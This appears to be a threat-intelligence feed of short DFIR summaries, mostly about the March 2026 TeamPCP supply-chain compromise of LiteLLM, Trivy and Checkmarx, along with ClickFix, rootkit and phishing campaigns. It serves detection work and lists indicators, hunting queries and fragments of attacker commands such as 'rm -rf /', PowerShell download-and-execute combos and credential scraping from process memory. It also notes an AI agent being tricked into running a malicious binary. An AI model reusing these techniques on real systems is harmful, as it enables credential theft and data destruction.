Hunt for litellm_init.pth files in site-packages directories and monitor for systemd services polling external domains every ~50 minutes.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037047543738081390

item.title: LiteLLM Supply Chain Compromise
item.description:
LiteLLM supply chain compromise targeting AI infrastructure exposes critical weakness in LLM proxy frameworks. Malicious PyPI packages v1.82.7 and v1.82.8 exfiltrated credentials from 95M+ installations through sophisticated .pth file execution.
Key technical details: • Attack vector: Compromised maintainer GitHub account → CI/CD pipeline injection → malicious PyPI wheel distribution • Execution: litellm_init.pth file (34,628 bytes) auto-executes on Python startup, bypassing import monitoring • Payload: Double base64-encoded reconnaissance harvesting env vars, SSH keys, AWS/GCP/Azure creds, K8s secrets, CI/CD tokens • Exfiltration: AES-256-CBC encrypted data with RSA-4096 OAEP to https://models.litellm.cloud/ (typosquatting litellm.ai) • Scope: Complete credential exposure across entire LLM provider surface area due to proxy architecture
DFIR artifacts: • Search site-packages/ directories for litellm_init.pth • Monitor outbound connections to models.litellm.cloud • Check pip logs for litellm==1.82.7 or 1.82.8 installations • Review proxy_server.py modifications in v1.82.7
Impact: AI/ML infrastructure compromise affects credential aggregation points handling API keys for OpenAI, Anthropic, Azure, AWS Bedrock simultaneously.
Hunt for unauthorized .pth files in Python environments and audit LLM provider access logs for credential misuse patterns.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037038834051916261

item.title: Malicious LiteLLM versions linked to TeamPCP supply chain attack
item.description:
TeamPCP compromised LiteLLM v1.82.7-1.82.8 on PyPI with credential harvester targeting SSH keys, cloud tokens, and Kubernetes secrets. Attack likely originated from Trivy CI/CD breach, part of multi-ecosystem campaign.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037032786163347509

item.title: Pawn Storm Campaign Deploys PRISMEX, Targets Government and Critical Infrastructure Entities
item.description:
Russian 🇷🇺 Pawn Storm (APT28) deploys PRISMEX backdoor against Ukrainian 🇺🇦 defense supply chain using steganography and cloud services for C2. Campaign targets government and critical infrastructure with email-based persistence mechanisms.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037017149252710488

item.title: Enhanced message groups: Improving efficiency in email incident response · Blog · Sublime Security
item.description:
Sublime Security enhanced their email grouping algorithm to cluster similar phishing campaigns even with varied subjects, senders, and content.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037002024995197223

item.title: PolyShell attacks target 56% of all vulnerable Magento stores
item.description:
Mass exploitation of PolyShell in Magento 2.x/Adobe Commerce hits 56% of vulnerable stores since March 19th. Attackers deploy novel WebRTC skimmers that bypass CSP controls via encrypted UDP channels.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036986970728260080

item.title: Bubble AI app builder abused to steal Microsoft account credentials
item.description:
Threat actors bypass email security by abusing Bubble.io's legitimate domain to host phishing redirects targeting Microsoft credentials. AI-generated apps create complex JavaScript that evades automated analysis.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036971878875562289

item.title: Cisco Products: CVSS (Max): 8.6
item.description:
Critical IKEv2 DoS flaw (CVE-2026-20012, CVSS 8.6) affects Cisco IOS/XE, ASA, and FTD devices. Unauthenticated attackers can crash routers or exhaust firewall memory with crafted packets—no workarounds available.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036957184722882651

item.title: Device Code Phishing Hits 340+ Microsoft 365 Orgs Across Five Countries via OAuth Abuse
item.description:
Device code phishing campaign abuses OAuth to compromise Microsoft 365 identities across 340+ organizations in US 🇺🇸, Canada 🇨🇦, Australia 🇦🇺, New Zealand 🇳🇿, and Germany 🇩🇪.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036941651868832159

item.title: InfoSec News Nuggets 03/25/2026
item.description:
TeamPCP supply chain attack escalated from Trivy compromise to backdoor litellm versions 1.82.7-1.82.8, affecting 36% of cloud environments.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036926580078125413

item.title: How we built high speed threat hunting for email security · Blog · Sublime Security
item.description:
Sublime Security details their high-speed threat hunting architecture using Message Query Language (MQL) with candidate selection and evaluation phases, processing millions of emails through optimized warm/cold storage splits and parallel proce...
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036911472916259099

item.title: New Torg Grabber infostealer malware targets 728 crypto wallets
item.description:
New Torg Grabber infostealer targets 728 crypto wallets and 850 browser extensions using ClickFix technique. Features ABE bypass for Chrome cookie protection and reflective DLL injection with 334 samples compiled in just 3 months.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036896374260674716

item.title: Illuminating VoidLink: Technical analysis of the VoidLink rootkit framework
item.description:
Chinese 🇨🇳 threat actor's VoidLink rootkit exposed through leaked source code. Hybrid LKM-eBPF design evolved through 4 generations, showing sophisticated AI-assisted development that hides processes, network connections, and files across CentOS 7 to Ubuntu 22.04.
Technical details: • LKM component uses ftrace hooks on __x64_sys_getdents64, vfs_read for process/file hiding; masquerades as "amd_mem_encrypt" AMD driver • eBPF companion exploits bpf_probe_write_user() to manipulate Netlink buffers, hiding connections from ss utility by "swallowing" SOCK_DIAG_BY_FAMILY messages • ICMP C2 channel uses magic value 0xC0DE, XOR key 0x42, supports 10 commands including privilege escalation (GIVE_ROOT) and self-destruct • Advanced evasion: 3-second delayed hook installation, anti-debugging timer scanning for strace/gdb/bpftool, kill protection for designated PIDs
Infrastructure artifacts link to Alibaba Cloud 🇨🇳 IPs 8.149.128[.]10 and 116.62.172[.]147. Source code annotations in Simplified Chinese show phase-numbered development matching LLM conversation patterns.
Hunt for unsigned modules with AMD descriptions on non-AMD systems, ftrace hooks on syscall functions, and eBPF programs using bpf_probe_write_user helper.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036881330353442886

item.title: GlassWorm Malware Uses Solana Dead Drops to Deliver RAT and Steal Browser, Crypto Data
item.description:
GlassWorm campaign now uses Solana blockchain dead drops to deliver multi-stage RAT framework with Chrome extension masquerading as offline Google Docs. Steals browser data, crypto wallets, and captures keystrokes.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036866277134725540

item.title: TeamPCP’s Checkmarx GitHub Actions Attack: What You Need to Know
item.description:
TeamPCP's sophisticated supply chain attack cascaded from Trivy to Checkmarx, weaponizing GitHub Actions and CI/CD credentials to spread across multiple vendors. The campaign demonstrates how stolen CI tokens enable lateral movement between trusted ecosystems.
Key technical details: - CVE-2026-33634: Malicious v0.69.4 Trivy tag pushed using spoofed commits and backdated timestamps - Compromised Actions: checkmarx/ast-github-action, checkmarx/kics-github-action harvest runner secrets to tpcp.tar.gz - C2 Infrastructure: checkmarx[.]zone, scan.aquasecurtiy[.]org (45.148.10.212), Cloudflare tunnels - Fallback exfiltration creates docs-tpcp repos using victim's GITHUB_TOKEN - Malicious OpenVSX extensions: ast-results v2.53.0, cx-dev-assist v1.7.0 via compromised ast-phoenix account
Attack methodology: - Initial access via February 27 "Pwn Request" exposed Trivy service account token - March 19-24 escalation: poisoned GitHub releases → stolen CI credentials → cross-vendor pivot - CanisterWorm auto-propagated across 28+ npm packages using stolen publish tokens - Iran 🇮🇷-targeted destructive payload: rm -rf / on systems matching Asia/Tehran timezone
DFIR artifacts: - Hunt systemd services: pgmon.service, pgmonitor.service, internal-monitor.service - K8s DaemonSets: host-provisioner-std, host-provisioner-iran in kube-system namespace - Process memory scraping via /proc/[pid]/mem targeting Runner.Worker processes - Steganography in v3.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036851127723905408

item.title: Credential‑Stealing Malware in LiteLLM Supply Chain Attack
item.description:
TeamPCP threat group compromised LiteLLM Python package versions 1.82.7 and 1.82.8 on PyPI, deploying credential-stealing malware via supply chain attack. Check your Python environments for these malicious versions immediately.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036805777717973204

item.title: The Unintentional Enabler: How Cloudflare Services are Abused for Credential Theft and Malware Distribution
item.description:
Cloudflare Workers and Tunnels increasingly abused for credential phishing and malware delivery, with 2025 showing significant campaign peaks.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036790741578444879

item.title: Silver Fox: The Only Tax Audit Where the Fine Print Installs Malware
item.description:
Chinese 🇨🇳 Silver Fox group evolved from financially motivated cybercrime to APT-style operations since 2024, using tax audit lures to deliver malware. Reflects broader trend of criminal-espionage convergence in 2025.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036775572685111617

item.title: Kamasers Analysis: A Multi-Vector DDoS Botnet Targeting Organizations Worldwide
item.description:
Kamasers botnet delivers sophisticated multi-vector DDoS attacks plus secondary payload capability through resilient Dead Drop Resolver using GitHub, Telegram, and Dropbox for C2 discovery.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036760432824771040

item.title: InfoSec News Nuggets 03/24/2026
item.description:
Critical Langflow CVE-2026-33017 exploited within 20 hours of disclosure via unauthenticated RCE. Oracle emergency-patched CVE-2026-21992 in Identity Manager. Crunchyroll breached via compromised BPO SSO account.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036745330255925355

item.title: ClickFix Campaigns Targeting Windows and macOS
item.description:
Five distinct ClickFix clusters targeting Windows and macOS users across multiple sectors identified. Campaigns impersonate QuickBooks, Booking.com, and Birdeye to manipulate victims into executing malicious commands via native system tools.
Key technical details: • Standardized 4-stage execution: obfuscated input → native shell execution → remote payload retrieval → in-memory execution • Clusters deliver NetSupport RAT, Lumma Stealer, and MacSync infostealer via LOLBins (powershell.exe, Terminal, curl) • QuickBooks cluster uses romantic naming convention (e.g., "DesireSpark Serenade") for %LOCALAPPDATA% staging directories • Booking.com variant extracts at.7z with password "pppp", establishes persistence via Startup folder hijacking • macOS campaigns use multi-stage encoding (hex→Base64→zsh) with xxd -r -p for payload decoding
Attack methodology: • Pastejacking via fake CAPTCHA/verification prompts copies malicious PowerShell/Terminal commands to clipboard • Commands use -NoProfile -ExecutionPolicy Bypass flags and curl -kfsSL arguments to evade detection • Infrastructure behind Cloudflare for resilience, disposable domains with shared C2 endpoints • OS detection delivers platform-tailored lures and execution chains
Hunt for unsigned PowerShell execution with Invoke-RestMethod + Invoke-Expression combo, xxd usage in Terminal history, and outbound connections to recently registered domains with "bird", "pulse", or brand impersonation themes.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036730287837556956

item.title: Spyware Campaign Impersonates Emergency Alert App to Target Mobile Users
item.description:
Mobile spyware campaign distributes trojanized Israel's 🇮🇱 Red Alert app via SMS, maintaining legitimate alert functionality while exfiltrating SMS, contacts, and location data to attacker servers.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036715143371862343

item.title: “Mirax Bot” Android Malware Enables Remote Banking Fraud
item.description:
Mirax Bot Android banking malware uses HVNC for silent remote control and supports hundreds of banking app overlays to capture credentials and authorize transactions undetected. Also converts infected devices into residential proxies.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036699996930572601

item.title: Julius v0.2.0: From 33 to 63 Probes — Now Detecting Cloud AI, Enterprise Inference, and RAG Pipelines
item.description:
Julius v0.2.0 doubles LLM fingerprinting probes to 63, adding cloud AI services (AWS Bedrock, Azure OpenAI, Vertex AI) and self-hosted RAG platforms. Many RAG systems default to no authentication, creating shadow IT risks for document exposure.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036684926171390027

item.title: Which Came First: The System Prompt, or the RCE?
item.description:
Praetorian bypassed AI agent security by uploading mismatched C source/binary pairs - agent trusted "Hello World" code but executed malicious ELF payload. Automated LLM-on-LLM testing discovered the attack path in hours.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036669823137022173

item.title: TeamPCP Backdoors LiteLLM Versions 1.82.7–1.82.8 Likely via Trivy CI/CD Compromise
item.description:
TeamPCP backdoored LiteLLM Python package versions 1.82.7-1.82.8 with credential harvester and Kubernetes lateral movement toolkit after compromising Trivy CI/CD. Check your Python environments for these malicious versions.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036655319858733260

item.title: PTC warns of imminent threat from critical Windchill, FlexPLM RCE bug
item.description:
PTC warns of critical RCE bug CVE-2026-4681 in Windchill/FlexPLM with credible imminent threat. German 🇩🇪 federal police dispatching agents to alert companies nationwide shows severity of this PLM supply chain risk.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036639608100753837

item.title: SmartApeSG campaign pushes Remcos RAT, NetSupport RAT, StealC, and Sectop RAT (ArechClient2), (Wed, Mar 25th)
item.description:
SmartApeSG campaign deploys multi-stage RAT arsenal via ClickFix social engineering. Single infection chain delivers four distinct malware families over 2.5-hour timeline, showcasing sophisticated payload orchestration.
Key technical details: • ClickFix technique injects malicious PowerShell into clipboard via fake CAPTCHA pages • Multi-stage delivery: Remcos RAT → NetSupport RAT → StealC → Sectop RAT (ArechClient2) • DLL side-loading technique used for Remcos, StealC, and Sectop deployment • C2 infrastructure spans multiple IPs: 95.142.45[.]231, 185.163.47[.]220, 89.46.38[.]100, 195.85.115[.]11
Attack methodology: • Initial vector: Compromised legitimate websites with injected scripts • HTA file (post.hta) retrieved to %LOCALAPPDATA% and auto-deleted post-execution • Staged payload drops in C:\ProgramData\ and C:\Users\Public\Music\ • Timeline shows deliberate spacing between RAT deployments (4 min, 1 hr, 1 hr 18 min intervals)
Hunt for unsigned DLLs in system directories with recent timestamps, monitor clipboard modifications, and inspect HTA execution from AppData locations.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036624784394437098

item.title: Guidance for detecting, investigating, and defending against the Trivy supply chain compromise
item.description:
Supply chain attack compromises Trivy vulnerability scanner and GitHub Actions, weaponizing trusted security tooling to steal credentials from CI/CD pipelines worldwide.
Key technical details: • TeamPCP actors force-pushed malicious code to 76/77 tags in trivy-action and all 7 tags in setup-trivy, redirecting trusted references without visible changes • Malicious Trivy v0.69.4 binary published to official channels with credential-harvesting payload alongside legitimate scanning functionality • Python stealer targets AWS/GCP/Azure credentials via IMDS (169.254.170.2, 169.254.169.254), Kubernetes secrets, CI/CD tokens, and VPN configs • Data exfiltrated via AES-256-CBC+RSA encryption to typosquatted domain scan.aquasecurtiy[.]org • Attack expanded beyond Trivy to compromise Checkmarx KICS and LiteLLM frameworks
Hunt for processes executing "pgrep -f Runner.Worker", outbound connections to 45.148.10.212, and openssl encryption operations with "-pass file:" in CI/CD environments.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036609428032504000

item.title: Tracing Blockchain-Controlled Malware Across Chains: A Joint Investigation by VMRay and Iknaio
item.description:
VMRay and Iknaio traced blockchain-controlled malware using BSC smart contracts as C2 infrastructure.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036594210766471261

item.title: LiteLLM compromised on PyPI: Tracing the March 2026 TeamPCP supply chain campaign
item.description:
TeamPCP supply chain attack compromises LiteLLM on PyPI, marking latest phase in 5-day campaign that started with Trivy, expanded through npm, and targeted CI/CD across multiple vendors.
Critical impact analysis: • LiteLLM 1.82.7/1.82.8 released March 24 with credential harvesting payload - 1.82.8 uses .pth file executing on Python startup • Campaign timeline: Trivy (Mar 19) → npm worm (Mar 20-22) → Checkmarx/OpenVSX (Mar 23) → LiteLLM (Mar 24) • Payload steals AWS/GCP/Azure creds, SSH keys, K8s tokens, wallet files, CI secrets - exfiltrates to models.litellm[.]cloud • Installs persistence via ~/.config/sysmon/sysmon.py and systemd unit, polls checkmarx[.]zone/raw for second-stage • K8s escalation creates privileged node-setup-* pods; Iranian 🇮🇷 systems get destructive "kamikaze" container wiping host filesystem
Hunt for litellm_init.pth files, outbound traffic to models.litellm[.]cloud, and K8s audit logs showing Python-urllib user agents accessing secrets APIs.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036579153399382280

item.title: Attack Paths Don’t Stop at Identity Providers
item.description:
BloodHound Enterprise now models Okta environments to expose cross-platform identity attack paths from Active Directory through federated SSO to downstream apps.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036564018727387279

item.title: Tax Search Ads Deliver ScreenConnect Malware Using Huawei Driver to Disable EDR
item.description:
Tax-themed malvertising campaign serves weaponized ScreenConnect installers with HwAudKiller tool that exploits Huawei drivers to disable EDR solutions via BYOVD technique. Active since January targeting US 🇺🇸 tax searches through Google Ads.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036548869161427335

item.title: Three’s a Crowd: TeamPCP trojanizes LiteLLM in Continuation of Campaign
item.description:
TeamPCP trojanized LiteLLM versions 1.82.7 and 1.82.8, using Python .pth files for persistence while exfiltrating cloud credentials and CI/CD secrets to attacker domains.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036533856069640213

item.title: Threat Actors Abuse Railway.com PaaS as Microsoft 365 Token Attack Infrastructure
item.description:
Threat actors exploit Railway.com PaaS to launch massive Microsoft 365 device code phishing campaign targeting 344+ organizations across construction, legal, and finance sectors. EvilTokens PhaaS platform identified as attribution.
Campaign weaponizes OAuth device flow with unprecedented scale and automation: • EvilTokens PhaaS offers "Office 365 Capture Link" with AI-powered lure generation, custom branding, and vulnerable URL redirection chains • Railway IPs (162.220.234.41, 162.220.234.66, 162.220.232.57) serve as clean reputation token harvesting infrastructure • Multi-hop redirect chains abuse Cisco/Trend Micro/Mimecast URL rewriters → compromised sites → workers.dev endpoints • Device codes rendered directly on landing pages eliminate email-based code delivery, streamlining victim interaction • Synthetic iPhone UA strings (iOS 18.7 + Version/26.3) provide high-fidelity detection signatures
Attack bypasses MFA entirely - victims authenticate legitimately but under attacker-controlled conditions. Tokens remain valid 90 days post-compromise, surviving password resets.
Hunt for successful logins from Railway CIDR blocks (162.220.232.0/22, 162.220.234.0/22) in SigninLogs where ResultType == 0. Block device code flows via Conditional Access and revoke all refresh tokens for affected users immediately.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036518861411909902

item.title: ICS phishing: Stopping a surge of malicious calendar invites · Blog · Sublime Security
item.description:
New ICS phishing attacks use malicious calendar invites (.ics files) to bypass email security - even when emails are quarantined, the calendar entries persist with phishing payloads.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036503696872501300

item.title: Azure APIM Signup Bypass: 97.9% of Developer Portals Still Exploitable Anonymously and from the Internet
item.description:
Azure APIM's "disable signup" toggle is purely cosmetic - the /signup endpoint remains active, letting anonymous attackers create accounts and obtain API keys. 97.9% of 25,000+ internet-facing portals still vulnerable.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036488601093996800

item.title: RTFM: Read The Fatal Manual – When Vendor Documentation Creates Critical Attack Paths
item.description:
Major vendor documentation from 16 companies actively guided administrators to deploy critical AD CS misconfigurations for over 4 years. ESC1, ESC3, and ESC4 attacks enable domain compromise in seconds.
Key findings: • 23 pieces of documentation across Cisco 🇺🇸, Oracle 🇺🇸, HP 🇺🇸, CyberArk 🇮🇱, ManageEngine 🇮🇳, and 11 others contained ESC1/ESC3/ESC4 guidance • Most common: duplicating User/Computer templates with "Supply in request" enabled, granting Enroll to Domain Users/Authenticated Users (T1649) • ServiceNow 🇺🇸 documentation created gMSA misconfiguration allowing any domain computer to read service account passwords • Response times varied: CyberArk 🇮🇱/Iru 🇺🇸/ManageEngine 🇮🇳 fixed within month, Cisco 🇺🇸/Oracle 🇺🇸/HP 🇺🇸 remain partially unresolved • Documentation flaws create worse attack paths than traditional CVEs - any domain user can escalate to DA
Hunt for certificate templates with msPKI-Certificate-Name-Flag=1, client authentication enabled, and broad Enroll permissions using Certify.exe or BloodHound queries.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036473533472055775

item.title: Building a Detection Foundation: Part 4 - Sysmon
item.description:
Sysmon fills critical visibility gaps that native Windows logging misses, providing enhanced process creation details, network connections, and file modifications essential for threat hunting and incident response.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036443376732573925

item.title: Common Entra ID Security Assessment Findings – Part 1: Foreign Enterprise Applications With Privileged API Permissions
item.description:
Foreign Entra ID enterprise applications with privileged API permissions pose significant risk—credentials controlled in external tenants can bypass Conditional Access and enable tenant-wide data exfiltration or privilege escalation.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036413088509862296

item.title: TeamPCP Hacks Checkmarx GitHub Actions Using Stolen CI Credentials
item.description:
TeamPCP compromised Checkmarx GitHub Actions workflows using stolen CI credentials, marking another supply chain attack following their Trivy campaign. Review your CI/CD pipelines for unauthorized workflow modifications and credential exposure.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036397957998686439

item.title: TeamPCP expands: Supply chain compromise spreads from Trivy to Checkmarx GitHub Actions
item.description:
TeamPCP threat actor expands supply chain attack from Trivy to Checkmarx GitHub Actions, using stolen credentials to cascade compromise across CI/CD pipelines. Second wave uses identical stealer payload with vendor-specific typosquat domains.
Key technical details: • Initial Trivy compromise (March 19) harvested credentials via /proc/*/mem scraping, IMDS queries to 169.254.169.254, and webhook enumeration • Checkmarx wave (March 23) used stolen PATs to poison ast-github-action v2.3.28 with identical tpcp.tar.gz payload • Exfiltration to typosquats: scan.aquasecurtiy[.]org (45.148.10.212) and checkmarx[.]zone using AES-256+RSA-4096 encryption • Same kill chain: Runner.Worker → bash → setup script → curl POST with identical headers and binary upload pattern
Attack methodology: • Force-pushed 75/76 version tags in compromised repositories to redirect to malicious commits • Memory extraction targets GitHub PATs, AWS/GCP credentials, and webhook URLs from runner processes • Cascading compromise: stolen credentials enable poisoning additional actions in accessible repos • Vendor-specific domains reduce detection likelihood in CI/CD logs
Hunt for curl POST requests from CI runners to external domains with application/octet-stream content-type and tpcp.tar.gz filenames in process arguments.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036382898211651749

item.title: FBI warns of Russian, Iranian cyber activity involving messaging platforms
item.description:
Russian 🇷🇺 SVR targeting Signal accounts of US 🇺🇸 officials via phishing, while Iranian 🇮🇷 MOIS uses Telegram bots for C2 in Handala operations. Both campaigns exploit user trust in encrypted messaging platforms to bypass encryption.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2036337574399103407
